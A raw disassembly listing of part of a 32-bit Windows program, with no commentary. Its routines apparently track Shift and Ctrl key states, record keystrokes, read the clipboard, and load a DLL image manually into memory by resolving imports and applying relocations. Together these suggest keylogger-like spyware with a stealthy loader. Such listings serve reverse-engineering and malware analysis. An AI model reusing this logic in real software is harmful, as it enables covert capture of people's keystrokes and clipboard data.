  404f52:	8d 45 fd             	lea    -0x3(%ebp),%eax
  404f55:	83 ec 10             	sub    $0x10,%esp
  404f58:	8b cc                	mov    %esp,%ecx
  404f5a:	eb 69                	jmp    0x404fc5
  404f5c:	8b 46 3c             	mov    0x3c(%esi),%eax
  404f5f:	3d a0 00 00 00       	cmp    $0xa0,%eax
  404f64:	74 73                	je     0x404fd9
  404f66:	3d a1 00 00 00       	cmp    $0xa1,%eax
  404f6b:	74 6c                	je     0x404fd9
  404f6d:	50                   	push   %eax
  404f6e:	ff 15 68 03 41 00    	call   *0x410368
  404f74:	59                   	pop    %ecx
  404f75:	88 45 ff             	mov    %al,-0x1(%ebp)
  404f78:	53                   	push   %ebx
  404f79:	8d 45 fd             	lea    -0x3(%ebp),%eax
  404f7c:	83 ec 10             	sub    $0x10,%esp
  404f7f:	8b cc                	mov    %esp,%ecx
  404f81:	eb 42                	jmp    0x404fc5
  404f83:	38 5e 2d             	cmp    %bl,0x2d(%esi)
  404f86:	75 18                	jne    0x404fa0
  404f88:	ff 76 3c             	push   0x3c(%esi)
  404f8b:	ff 15 68 03 41 00    	call   *0x410368
  404f91:	59                   	pop    %ecx
  404f92:	88 45 ff             	mov    %al,-0x1(%ebp)
  404f95:	53                   	push   %ebx
  404f96:	8d 45 fd             	lea    -0x3(%ebp),%eax
  404f99:	83 ec 10             	sub    $0x10,%esp
  404f9c:	8b cc                	mov    %esp,%ecx
  404f9e:	eb 25                	jmp    0x404fc5
  404fa0:	8b 46 3c             	mov    0x3c(%esi),%eax
  404fa3:	3d a0 00 00 00       	cmp    $0xa0,%eax
  404fa8:	74 2f                	je     0x404fd9
  404faa:	3d a1 00 00 00       	cmp    $0xa1,%eax
  404faf:	74 28                	je     0x404fd9
  404fb1:	50                   	push   %eax
  404fb2:	ff 15 6c 03 41 00    	call   *0x41036c
  404fb8:	59                   	pop    %ecx
  404fb9:	88 45 ff             	mov    %al,-0x1(%ebp)
  404fbc:	53                   	push   %ebx
  404fbd:	8d 45 fd             	lea    -0x3(%ebp),%eax
  404fc0:	83 ec 10             	sub    $0x10,%esp
  404fc3:	8b cc                	mov    %esp,%ecx
  404fc5:	50                   	push   %eax
  404fc6:	8d 45 ff             	lea    -0x1(%ebp),%eax
  404fc9:	6a 01                	push   $0x1
  404fcb:	50                   	push   %eax
  404fcc:	ff 15 70 02 41 00    	call   *0x410270
  404fd2:	8b ce                	mov    %esi,%ecx
  404fd4:	e8 c1 ea ff ff       	call   0x403a9a
  404fd9:	5f                   	pop    %edi
  404fda:	5e                   	pop    %esi
  404fdb:	5b                   	pop    %ebx
  404fdc:	c9                   	leave
  404fdd:	c3                   	ret
  404fde:	55                   	push   %ebp
  404fdf:	8b ec                	mov    %esp,%ebp
  404fe1:	51                   	push   %ecx
  404fe2:	51                   	push   %ecx
  404fe3:	56                   	push   %esi
  404fe4:	8b f1                	mov    %ecx,%esi
  404fe6:	83 7e 34 10          	cmpl   $0x10,0x34(%esi)
  404fea:	75 7f                	jne    0x40506b
  404fec:	8b 46 3c             	mov    0x3c(%esi),%eax
  404fef:	83 e8 45             	sub    $0x45,%eax
  404ff2:	74 5a                	je     0x40504e
  404ff4:	83 e8 75             	sub    $0x75,%eax
  404ff7:	74 43                	je     0x40503c
  404ff9:	48                   	dec    %eax
  404ffa:	74 2e                	je     0x40502a
  404ffc:	83 e8 05             	sub    $0x5,%eax
  404fff:	74 17                	je     0x405018
  405001:	83 e8 1e             	sub    $0x1e,%eax
  405004:	75 65                	jne    0x40506b
  405006:	6a 01                	push   $0x1
  405008:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40500b:	83 ec 10             	sub    $0x10,%esp
  40500e:	8b cc                	mov    %esp,%ecx
  405010:	50                   	push   %eax
  405011:	68 94 08 41 00       	push   $0x410894
  405016:	eb 46                	jmp    0x40505e
  405018:	6a 01                	push   $0x1
  40501a:	8d 45 fe             	lea    -0x2(%ebp),%eax
  40501d:	83 ec 10             	sub    $0x10,%esp
  405020:	8b cc                	mov    %esp,%ecx
  405022:	50                   	push   %eax
  405023:	68 98 08 41 00       	push   $0x410898
  405028:	eb 34                	jmp    0x40505e
  40502a:	6a 01                	push   $0x1
  40502c:	8d 45 fd             	lea    -0x3(%ebp),%eax
  40502f:	83 ec 10             	sub    $0x10,%esp
  405032:	8b cc                	mov    %esp,%ecx
  405034:	50                   	push   %eax
  405035:	68 c8 08 41 00       	push   $0x4108c8
  40503a:	eb 22                	jmp    0x40505e
  40503c:	6a 01                	push   $0x1
  40503e:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405041:	83 ec 10             	sub    $0x10,%esp
  405044:	8b cc                	mov    %esp,%ecx
  405046:	50                   	push   %eax
  405047:	68 d0 08 41 00       	push   $0x4108d0
  40504c:	eb 10                	jmp    0x40505e
  40504e:	6a 01                	push   $0x1
  405050:	8d 45 fb             	lea    -0x5(%ebp),%eax
  405053:	83 ec 10             	sub    $0x10,%esp
  405056:	8b cc                	mov    %esp,%ecx
  405058:	50                   	push   %eax
  405059:	68 64 0a 41 00       	push   $0x410a64
  40505e:	ff 15 4c 02 41 00    	call   *0x41024c
  405064:	8b ce                	mov    %esi,%ecx
  405066:	e8 2f ea ff ff       	call   0x403a9a
  40506b:	5e                   	pop    %esi
  40506c:	c9                   	leave
  40506d:	c3                   	ret
  40506e:	55                   	push   %ebp
  40506f:	8b ec                	mov    %esp,%ebp
  405071:	51                   	push   %ecx
  405072:	56                   	push   %esi
  405073:	8b f1                	mov    %ecx,%esi
  405075:	8b 46 3c             	mov    0x3c(%esi),%eax
  405078:	2d a2 00 00 00       	sub    $0xa2,%eax
  40507d:	74 15                	je     0x405094
  40507f:	48                   	dec    %eax
  405080:	75 2f                	jne    0x4050b1
  405082:	6a 01                	push   $0x1
  405084:	8d 45 ff             	lea    -0x1(%ebp),%eax
  405087:	83 ec 10             	sub    $0x10,%esp
  40508a:	8b cc                	mov    %esp,%ecx
  40508c:	50                   	push   %eax
  40508d:	68 74 0a 41 00       	push   $0x410a74
  405092:	eb 10                	jmp    0x4050a4
  405094:	6a 01                	push   $0x1
  405096:	8d 45 fe             	lea    -0x2(%ebp),%eax
  405099:	83 ec 10             	sub    $0x10,%esp
  40509c:	8b cc                	mov    %esp,%ecx
  40509e:	50                   	push   %eax
  40509f:	68 68 0a 41 00       	push   $0x410a68
  4050a4:	ff 15 4c 02 41 00    	call   *0x41024c
  4050aa:	8b ce                	mov    %esi,%ecx
  4050ac:	e8 e9 e9 ff ff       	call   0x403a9a
  4050b1:	5e                   	pop    %esi
  4050b2:	c9                   	leave
  4050b3:	c3                   	ret
  4050b4:	8b 41 3c             	mov    0x3c(%ecx),%eax
  4050b7:	2d a0 00 00 00       	sub    $0xa0,%eax
  4050bc:	74 03                	je     0x4050c1
  4050be:	48                   	dec    %eax
  4050bf:	75 04                	jne    0x4050c5
  4050c1:	c6 41 2d 01          	movb   $0x1,0x2d(%ecx)
  4050c5:	c3                   	ret
  4050c6:	8b 41 3c             	mov    0x3c(%ecx),%eax
  4050c9:	2d a0 00 00 00       	sub    $0xa0,%eax
  4050ce:	74 03                	je     0x4050d3
  4050d0:	48                   	dec    %eax
  4050d1:	75 04                	jne    0x4050d7
  4050d3:	80 61 2d 00          	andb   $0x0,0x2d(%ecx)
  4050d7:	c3                   	ret
  4050d8:	8b 41 3c             	mov    0x3c(%ecx),%eax
  4050db:	2d a2 00 00 00       	sub    $0xa2,%eax
  4050e0:	74 03                	je     0x4050e5
  4050e2:	48                   	dec    %eax
  4050e3:	75 04                	jne    0x4050e9
  4050e5:	c6 41 2e 01          	movb   $0x1,0x2e(%ecx)
  4050e9:	c3                   	ret
  4050ea:	8b 41 3c             	mov    0x3c(%ecx),%eax
  4050ed:	2d a2 00 00 00       	sub    $0xa2,%eax
  4050f2:	74 03                	je     0x4050f7
  4050f4:	48                   	dec    %eax
  4050f5:	75 04                	jne    0x4050fb
  4050f7:	80 61 2e 00          	andb   $0x0,0x2e(%ecx)
  4050fb:	c3                   	ret
  4050fc:	55                   	push   %ebp
  4050fd:	8b ec                	mov    %esp,%ebp
  4050ff:	51                   	push   %ecx
  405100:	56                   	push   %esi
  405101:	6a 00                	push   $0x0
  405103:	ff 15 f0 03 41 00    	call   *0x4103f0
  405109:	85 c0                	test   %eax,%eax
  40510b:	74 1b                	je     0x405128
  40510d:	6a 01                	push   $0x1
  40510f:	ff 15 ec 03 41 00    	call   *0x4103ec
  405115:	8b f0                	mov    %eax,%esi
  405117:	ff 15 e8 03 41 00    	call   *0x4103e8
  40511d:	85 f6                	test   %esi,%esi
  40511f:	74 07                	je     0x405128
  405121:	8d 45 ff             	lea    -0x1(%ebp),%eax
  405124:	50                   	push   %eax
  405125:	56                   	push   %esi
  405126:	eb 09                	jmp    0x405131
  405128:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40512b:	50                   	push   %eax
  40512c:	68 68 06 41 00       	push   $0x410668
  405131:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405134:	ff 15 4c 02 41 00    	call   *0x41024c
  40513a:	8b 45 08             	mov    0x8(%ebp),%eax
  40513d:	5e                   	pop    %esi
  40513e:	c9                   	leave
  40513f:	c2 04 00             	ret    $0x4
  405142:	55                   	push   %ebp
  405143:	8b ec                	mov    %esp,%ebp
  405145:	83 ec 24             	sub    $0x24,%esp
  405148:	f6 05 b8 56 41 00 01 	testb  $0x1,0x4156b8
  40514f:	53                   	push   %ebx
  405150:	56                   	push   %esi
  405151:	57                   	push   %edi
  405152:	8b d9                	mov    %ecx,%ebx
  405154:	bf a8 56 41 00       	mov    $0x4156a8,%edi
  405159:	75 1e                	jne    0x405179
  40515b:	80 0d b8 56 41 00 01 	orb    $0x1,0x4156b8
  405162:	8d 45 ff             	lea    -0x1(%ebp),%eax
  405165:	50                   	push   %eax
  405166:	8b cf                	mov    %edi,%ecx
  405168:	ff 15 50 02 41 00    	call   *0x410250
  40516e:	68 01 52 40 00       	push   $0x405201
  405173:	e8 42 ab 00 00       	call   0x40fcba
  405178:	59                   	pop    %ecx
  405179:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40517c:	8b cb                	mov    %ebx,%ecx
  40517e:	50                   	push   %eax
  40517f:	e8 78 ff ff ff       	call   0x4050fc
  405184:	be a8 56 41 00       	mov    $0x4156a8,%esi
  405189:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40518c:	56                   	push   %esi
  40518d:	50                   	push   %eax
  40518e:	ff 15 28 02 41 00    	call   *0x410228
  405194:	59                   	pop    %ecx
  405195:	84 c0                	test   %al,%al
  405197:	59                   	pop    %ecx
  405198:	75 59                	jne    0x4051f3
  40519a:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40519d:	8b cf                	mov    %edi,%ecx
  40519f:	50                   	push   %eax
  4051a0:	ff 15 64 02 41 00    	call   *0x410264
  4051a6:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4051a9:	68 68 06 41 00       	push   $0x410668
  4051ae:	50                   	push   %eax
  4051af:	ff 15 a4 02 41 00    	call   *0x4102a4
  4051b5:	59                   	pop    %ecx
  4051b6:	84 c0                	test   %al,%al
  4051b8:	59                   	pop    %ecx
  4051b9:	74 38                	je     0x4051f3
  4051bb:	6a 00                	push   $0x0
  4051bd:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4051c0:	83 ec 10             	sub    $0x10,%esp
  4051c3:	8b fc                	mov    %esp,%edi
  4051c5:	68 b4 0a 41 00       	push   $0x410ab4
  4051ca:	56                   	push   %esi
  4051cb:	68 80 0a 41 00       	push   $0x410a80
  4051d0:	50                   	push   %eax
  4051d1:	e8 44 aa 00 00       	call   0x40fc1a
  4051d6:	83 c4 0c             	add    $0xc,%esp
  4051d9:	50                   	push   %eax
  4051da:	57                   	push   %edi
  4051db:	e8 40 aa 00 00       	call   0x40fc20
  4051e0:	83 c4 0c             	add    $0xc,%esp
  4051e3:	8b cb                	mov    %ebx,%ecx
  4051e5:	e8 b0 e8 ff ff       	call   0x403a9a
  4051ea:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4051ed:	ff 15 54 02 41 00    	call   *0x410254
  4051f3:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4051f6:	ff 15 54 02 41 00    	call   *0x410254
  4051fc:	5f                   	pop    %edi
  4051fd:	5e                   	pop    %esi
  4051fe:	5b                   	pop    %ebx
  4051ff:	c9                   	leave
  405200:	c3                   	ret
  405201:	b9 a8 56 41 00       	mov    $0x4156a8,%ecx
  405206:	ff 25 54 02 41 00    	jmp    *0x410254
  40520c:	53                   	push   %ebx
  40520d:	56                   	push   %esi
  40520e:	8b f1                	mov    %ecx,%esi
  405210:	8d 4e 50             	lea    0x50(%esi),%ecx
  405213:	ff 15 58 02 41 00    	call   *0x410258
  405219:	50                   	push   %eax
  40521a:	ff 15 50 01 41 00    	call   *0x410150
  405220:	85 c0                	test   %eax,%eax
  405222:	0f 95 c3             	setne  %bl
  405225:	83 c6 60             	add    $0x60,%esi
  405228:	68 68 06 41 00       	push   $0x410668
  40522d:	56                   	push   %esi
  40522e:	ff 15 a4 02 41 00    	call   *0x4102a4
  405234:	59                   	pop    %ecx
  405235:	84 c0                	test   %al,%al
  405237:	59                   	pop    %ecx
  405238:	74 0f                	je     0x405249
  40523a:	8b ce                	mov    %esi,%ecx
  40523c:	ff 15 58 02 41 00    	call   *0x410258
  405242:	50                   	push   %eax
  405243:	ff 15 54 01 41 00    	call   *0x410154
  405249:	8a c3                	mov    %bl,%al
  40524b:	5e                   	pop    %esi
  40524c:	5b                   	pop    %ebx
  40524d:	c3                   	ret
  40524e:	56                   	push   %esi
  40524f:	57                   	push   %edi
  405250:	8b 3d 68 01 41 00    	mov    0x410168,%edi
  405256:	8b f1                	mov    %ecx,%esi
  405258:	6a 00                	push   $0x0
  40525a:	68 2c 38 40 00       	push   $0x40382c
  40525f:	80 66 38 00          	andb   $0x0,0x38(%esi)
  405263:	ff d7                	call   *%edi
  405265:	8b 06                	mov    (%esi),%eax
  405267:	85 c0                	test   %eax,%eax
  405269:	74 13                	je     0x40527e
  40526b:	50                   	push   %eax
  40526c:	ff 15 e4 03 41 00    	call   *0x4103e4
  405272:	83 26 00             	andl   $0x0,(%esi)
  405275:	6a 00                	push   $0x0
  405277:	68 0c 38 40 00       	push   $0x40380c
  40527c:	ff d7                	call   *%edi
  40527e:	8b ce                	mov    %esi,%ecx
  405280:	e8 87 ff ff ff       	call   0x40520c
  405285:	5f                   	pop    %edi
  405286:	5e                   	pop    %esi
  405287:	c3                   	ret
  405288:	8b 41 08             	mov    0x8(%ecx),%eax
  40528b:	03 01                	add    (%ecx),%eax
  40528d:	c3                   	ret
  40528e:	55                   	push   %ebp
  40528f:	8b ec                	mov    %esp,%ebp
  405291:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405295:	57                   	push   %edi
  405296:	74 4f                	je     0x4052e7
  405298:	8b 3d 5c 57 41 00    	mov    0x41575c,%edi
  40529e:	85 ff                	test   %edi,%edi
  4052a0:	74 45                	je     0x4052e7
  4052a2:	56                   	push   %esi
  4052a3:	8b 75 08             	mov    0x8(%ebp),%esi
  4052a6:	8d 47 04             	lea    0x4(%edi),%eax
  4052a9:	8a 10                	mov    (%eax),%dl
  4052ab:	8a ca                	mov    %dl,%cl
  4052ad:	3a 16                	cmp    (%esi),%dl
  4052af:	75 1a                	jne    0x4052cb
  4052b1:	84 c9                	test   %cl,%cl
  4052b3:	74 12                	je     0x4052c7
  4052b5:	8a 50 01             	mov    0x1(%eax),%dl
  4052b8:	8a ca                	mov    %dl,%cl
  4052ba:	3a 56 01             	cmp    0x1(%esi),%dl
  4052bd:	75 0c                	jne    0x4052cb
  4052bf:	40                   	inc    %eax
  4052c0:	40                   	inc    %eax
  4052c1:	46                   	inc    %esi
  4052c2:	46                   	inc    %esi
  4052c3:	84 c9                	test   %cl,%cl
  4052c5:	75 e2                	jne    0x4052a9
  4052c7:	33 c0                	xor    %eax,%eax
  4052c9:	eb 05                	jmp    0x4052d0
  4052cb:	1b c0                	sbb    %eax,%eax
  4052cd:	83 d8 ff             	sbb    $0xffffffff,%eax
  4052d0:	85 c0                	test   %eax,%eax
  4052d2:	74 0a                	je     0x4052de
  4052d4:	8b bf 0c 01 00 00    	mov    0x10c(%edi),%edi
  4052da:	85 ff                	test   %edi,%edi
  4052dc:	75 c5                	jne    0x4052a3
  4052de:	85 ff                	test   %edi,%edi
  4052e0:	5e                   	pop    %esi
  4052e1:	74 04                	je     0x4052e7
  4052e3:	8b 07                	mov    (%edi),%eax
  4052e5:	eb 02                	jmp    0x4052e9
  4052e7:	33 c0                	xor    %eax,%eax
  4052e9:	5f                   	pop    %edi
  4052ea:	5d                   	pop    %ebp
  4052eb:	c3                   	ret
  4052ec:	55                   	push   %ebp
  4052ed:	8b ec                	mov    %esp,%ebp
  4052ef:	53                   	push   %ebx
  4052f0:	56                   	push   %esi
  4052f1:	8b 75 08             	mov    0x8(%ebp),%esi
  4052f4:	57                   	push   %edi
  4052f5:	33 ff                	xor    %edi,%edi
  4052f7:	8b 46 3c             	mov    0x3c(%esi),%eax
  4052fa:	57                   	push   %edi
  4052fb:	8d 44 30 18          	lea    0x18(%eax,%esi,1),%eax
  4052ff:	8b 40 38             	mov    0x38(%eax),%eax
  405302:	05 00 10 00 00       	add    $0x1000,%eax
  405307:	50                   	push   %eax
  405308:	57                   	push   %edi
  405309:	6a 04                	push   $0x4
  40530b:	57                   	push   %edi
  40530c:	6a ff                	push   $0xffffffff
  40530e:	ff 15 48 01 41 00    	call   *0x410148
  405314:	57                   	push   %edi
  405315:	57                   	push   %edi
  405316:	57                   	push   %edi
  405317:	8b d8                	mov    %eax,%ebx
  405319:	57                   	push   %edi
  40531a:	6a 02                	push   $0x2
  40531c:	53                   	push   %ebx
  40531d:	ff 15 4c 01 41 00    	call   *0x41014c
  405323:	53                   	push   %ebx
  405324:	8b f8                	mov    %eax,%edi
  405326:	ff 15 58 01 41 00    	call   *0x410158
  40532c:	57                   	push   %edi
  40532d:	56                   	push   %esi
  40532e:	e8 74 01 00 00       	call   0x4054a7
  405333:	57                   	push   %edi
  405334:	e8 12 00 00 00       	call   0x40534b
  405339:	6a 01                	push   $0x1
  40533b:	57                   	push   %edi
  40533c:	e8 e0 01 00 00       	call   0x405521
  405341:	83 c4 14             	add    $0x14,%esp
  405344:	8b c7                	mov    %edi,%eax
  405346:	5f                   	pop    %edi
  405347:	5e                   	pop    %esi
  405348:	5b                   	pop    %ebx
  405349:	5d                   	pop    %ebp
  40534a:	c3                   	ret
  40534b:	55                   	push   %ebp
  40534c:	8b ec                	mov    %esp,%ebp
  40534e:	51                   	push   %ecx
  40534f:	51                   	push   %ecx
  405350:	8b 45 08             	mov    0x8(%ebp),%eax
  405353:	53                   	push   %ebx
  405354:	56                   	push   %esi
  405355:	57                   	push   %edi
  405356:	8b 48 3c             	mov    0x3c(%eax),%ecx
  405359:	83 7c 01 74 10       	cmpl   $0x10,0x74(%ecx,%eax,1)
  40535e:	8d 5c 01 18          	lea    0x18(%ecx,%eax,1),%ebx
  405362:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  405365:	0f 82 30 01 00 00    	jb     0x40549b
  40536b:	83 7b 6c 00          	cmpl   $0x0,0x6c(%ebx)
  40536f:	0f 84 99 00 00 00    	je     0x40540e
  405375:	8b 73 68             	mov    0x68(%ebx),%esi
  405378:	03 f0                	add    %eax,%esi
  40537a:	83 3e 00             	cmpl   $0x0,(%esi)
  40537d:	0f 84 8b 00 00 00    	je     0x40540e
  405383:	8b 7e 0c             	mov    0xc(%esi),%edi
  405386:	03 f8                	add    %eax,%edi
  405388:	57                   	push   %edi
  405389:	e8 00 ff ff ff       	call   0x40528e
  40538e:	85 c0                	test   %eax,%eax
  405390:	59                   	pop    %ecx
  405391:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405394:	75 12                	jne    0x4053a8
  405396:	57                   	push   %edi
  405397:	ff 15 40 01 41 00    	call   *0x410140
  40539d:	85 c0                	test   %eax,%eax
  40539f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4053a2:	0f 84 f3 00 00 00    	je     0x40549b
  4053a8:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  4053ac:	75 51                	jne    0x4053ff
  4053ae:	8b 3e                	mov    (%esi),%edi
  4053b0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4053b3:	8b 5e 10             	mov    0x10(%esi),%ebx
  4053b6:	03 7d 08             	add    0x8(%ebp),%edi
  4053b9:	03 5d 08             	add    0x8(%ebp),%ebx
  4053bc:	89 46 08             	mov    %eax,0x8(%esi)
  4053bf:	c7 46 04 00 bc 3a 12 	movl   $0x123abc00,0x4(%esi)
  4053c6:	8b 07                	mov    (%edi),%eax
  4053c8:	85 c0                	test   %eax,%eax
  4053ca:	74 30                	je     0x4053fc
  4053cc:	a9 00 00 00 80       	test   $0x80000000,%eax
  4053d1:	74 05                	je     0x4053d8
  4053d3:	0f b7 c0             	movzwl %ax,%eax
  4053d6:	eb 08                	jmp    0x4053e0
  4053d8:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4053db:	03 c1                	add    %ecx,%eax
  4053dd:	83 c0 02             	add    $0x2,%eax
  4053e0:	50                   	push   %eax
  4053e1:	ff 75 fc             	push   -0x4(%ebp)
  4053e4:	ff 15 44 01 41 00    	call   *0x410144
  4053ea:	85 c0                	test   %eax,%eax
  4053ec:	0f 84 a9 00 00 00    	je     0x40549b
  4053f2:	89 03                	mov    %eax,(%ebx)
  4053f4:	83 c7 04             	add    $0x4,%edi
  4053f7:	83 c3 04             	add    $0x4,%ebx
  4053fa:	eb ca                	jmp    0x4053c6
  4053fc:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  4053ff:	8b 45 08             	mov    0x8(%ebp),%eax
  405402:	83 c6 14             	add    $0x14,%esi
  405405:	83 3e 00             	cmpl   $0x0,(%esi)
  405408:	0f 85 75 ff ff ff    	jne    0x405383
  40540e:	8b f8                	mov    %eax,%edi
  405410:	2b 7b 1c             	sub    0x1c(%ebx),%edi
  405413:	0f 84 86 00 00 00    	je     0x40549f
  405419:	83 bb 8c 00 00 00 00 	cmpl   $0x0,0x8c(%ebx)
  405420:	74 7d                	je     0x40549f
  405422:	8b 8b 88 00 00 00    	mov    0x88(%ebx),%ecx
  405428:	03 c8                	add    %eax,%ecx
  40542a:	83 39 00             	cmpl   $0x0,(%ecx)
  40542d:	74 70                	je     0x40549f
  40542f:	8b 59 04             	mov    0x4(%ecx),%ebx
  405432:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405436:	83 eb 08             	sub    $0x8,%ebx
  405439:	8d 71 08             	lea    0x8(%ecx),%esi
  40543c:	d1 eb                	shr    $1,%ebx
  40543e:	85 db                	test   %ebx,%ebx
  405440:	7e 54                	jle    0x405496
  405442:	0f b7 16             	movzwl (%esi),%edx
  405445:	8b c2                	mov    %edx,%eax
  405447:	25 ff 0f 00 00       	and    $0xfff,%eax
  40544c:	03 01                	add    (%ecx),%eax
  40544e:	c1 ea 0c             	shr    $0xc,%edx
  405451:	03 45 08             	add    0x8(%ebp),%eax
  405454:	83 ea 00             	sub    $0x0,%edx
  405457:	74 33                	je     0x40548c
  405459:	4a                   	dec    %edx
  40545a:	74 28                	je     0x405484
  40545c:	4a                   	dec    %edx
  40545d:	74 20                	je     0x40547f
  40545f:	4a                   	dec    %edx
  405460:	74 19                	je     0x40547b
  405462:	4a                   	dec    %edx
  405463:	75 36                	jne    0x40549b
  405465:	0f b7 56 02          	movzwl 0x2(%esi),%edx
  405469:	83 c6 02             	add    $0x2,%esi
  40546c:	8d 94 3a 00 80 00 00 	lea    0x8000(%edx,%edi,1),%edx
  405473:	c1 ea 10             	shr    $0x10,%edx
  405476:	66 09 10             	or     %dx,(%eax)
  405479:	eb 11                	jmp    0x40548c
  40547b:	01 38                	add    %edi,(%eax)
  40547d:	eb 0d                	jmp    0x40548c
  40547f:	66 01 38             	add    %di,(%eax)
  405482:	eb 08                	jmp    0x40548c
  405484:	8b d7                	mov    %edi,%edx
  405486:	c1 ea 10             	shr    $0x10,%edx
  405489:	66 01 10             	add    %dx,(%eax)
  40548c:	46                   	inc    %esi
  40548d:	46                   	inc    %esi
  40548e:	ff 45 fc             	incl   -0x4(%ebp)
  405491:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  405494:	7c ac                	jl     0x405442
  405496:	03 49 04             	add    0x4(%ecx),%ecx
  405499:	eb 8f                	jmp    0x40542a
  40549b:	33 c0                	xor    %eax,%eax
  40549d:	eb 03                	jmp    0x4054a2
  40549f:	6a 01                	push   $0x1
  4054a1:	58                   	pop    %eax
  4054a2:	5f                   	pop    %edi
  4054a3:	5e                   	pop    %esi
  4054a4:	5b                   	pop    %ebx
  4054a5:	c9                   	leave
  4054a6:	c3                   	ret
  4054a7:	55                   	push   %ebp
  4054a8:	8b ec                	mov    %esp,%ebp
  4054aa:	51                   	push   %ecx
  4054ab:	8b 45 08             	mov    0x8(%ebp),%eax
  4054ae:	53                   	push   %ebx
  4054af:	56                   	push   %esi
  4054b0:	57                   	push   %edi
  4054b1:	8b 48 3c             	mov    0x3c(%eax),%ecx
  4054b4:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4054b7:	8b f0                	mov    %eax,%esi
  4054b9:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  4054bd:	8d 14 08             	lea    (%eax,%ecx,1),%edx
  4054c0:	8b 4c 08 54          	mov    0x54(%eax,%ecx,1),%ecx
  4054c4:	8b d9                	mov    %ecx,%ebx
  4054c6:	c1 e9 02             	shr    $0x2,%ecx
  4054c9:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4054cb:	8b cb                	mov    %ebx,%ecx
  4054cd:	83 e1 03             	and    $0x3,%ecx
  4054d0:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4054d2:	8b 48 3c             	mov    0x3c(%eax),%ecx
  4054d5:	66 83 7a 06 00       	cmpw   $0x0,0x6(%edx)
  4054da:	8d 8c 08 f8 00 00 00 	lea    0xf8(%eax,%ecx,1),%ecx
  4054e1:	76 36                	jbe    0x405519
  4054e3:	8d 79 14             	lea    0x14(%ecx),%edi
  4054e6:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4054e9:	8b 4f fc             	mov    -0x4(%edi),%ecx
  4054ec:	8b f0                	mov    %eax,%esi
  4054ee:	03 37                	add    (%edi),%esi
  4054f0:	8b 7f f8             	mov    -0x8(%edi),%edi
  4054f3:	03 7d 0c             	add    0xc(%ebp),%edi
  4054f6:	8b d9                	mov    %ecx,%ebx
  4054f8:	c1 e9 02             	shr    $0x2,%ecx
  4054fb:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4054fd:	8b cb                	mov    %ebx,%ecx
  4054ff:	83 e1 03             	and    $0x3,%ecx
  405502:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  405504:	8b 7d fc             	mov    -0x4(%ebp),%edi
  405507:	0f b7 4a 06          	movzwl 0x6(%edx),%ecx
  40550b:	83 c7 28             	add    $0x28,%edi
  40550e:	ff 45 08             	incl   0x8(%ebp)
  405511:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  405514:	89 7d fc             	mov    %edi,-0x4(%ebp)
  405517:	7c d0                	jl     0x4054e9
  405519:	6a 01                	push   $0x1
  40551b:	58                   	pop    %eax
  40551c:	5f                   	pop    %edi
  40551d:	5e                   	pop    %esi
  40551e:	5b                   	pop    %ebx
  40551f:	c9                   	leave
  405520:	c3                   	ret
  405521:	55                   	push   %ebp
  405522:	8b ec                	mov    %esp,%ebp
  405524:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405527:	8b 41 3c             	mov    0x3c(%ecx),%eax
  40552a:	03 c1                	add    %ecx,%eax
  40552c:	f6 40 17 20          	testb  $0x20,0x17(%eax)
  405530:	75 05                	jne    0x405537
  405532:	6a 01                	push   $0x1
  405534:	58                   	pop    %eax
  405535:	5d                   	pop    %ebp
  405536:	c3                   	ret
  405537:	8b 40 28             	mov    0x28(%eax),%eax
  40553a:	6a 00                	push   $0x0
  40553c:	ff 75 0c             	push   0xc(%ebp)
  40553f:	03 c1                	add    %ecx,%eax
  405541:	51                   	push   %ecx
  405542:	ff d0                	call   *%eax
  405544:	5d                   	pop    %ebp
  405545:	c3                   	ret
  405546:	55                   	push   %ebp
  405547:	8b ec                	mov    %esp,%ebp
  405549:	83 ec 0c             	sub    $0xc,%esp
  40554c:	8b 55 08             	mov    0x8(%ebp),%edx
  40554f:	85 d2                	test   %edx,%edx
  405551:	0f 84 c7 00 00 00    	je     0x40561e
  405557:	8b 42 3c             	mov    0x3c(%edx),%eax
  40555a:	83 7c 10 74 10       	cmpl   $0x10,0x74(%eax,%edx,1)
  40555f:	8d 44 10 18          	lea    0x18(%eax,%edx,1),%eax
  405563:	0f 82 b5 00 00 00    	jb     0x40561e
  405569:	83 78 64 00          	cmpl   $0x0,0x64(%eax)
  40556d:	0f 84 ab 00 00 00    	je     0x40561e
  405573:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405576:	8b 40 60             	mov    0x60(%eax),%eax
  405579:	c1 e9 10             	shr    $0x10,%ecx
  40557c:	03 c2                	add    %edx,%eax
  40557e:	66 85 c9             	test   %cx,%cx
  405581:	75 14                	jne    0x405597
  405583:	0f b7 4d 0c          	movzwl 0xc(%ebp),%ecx
  405587:	2b 48 10             	sub    0x10(%eax),%ecx
  40558a:	8b 40 1c             	mov    0x1c(%eax),%eax
  40558d:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  405590:	8b 04 10             	mov    (%eax,%edx,1),%eax
  405593:	03 c2                	add    %edx,%eax
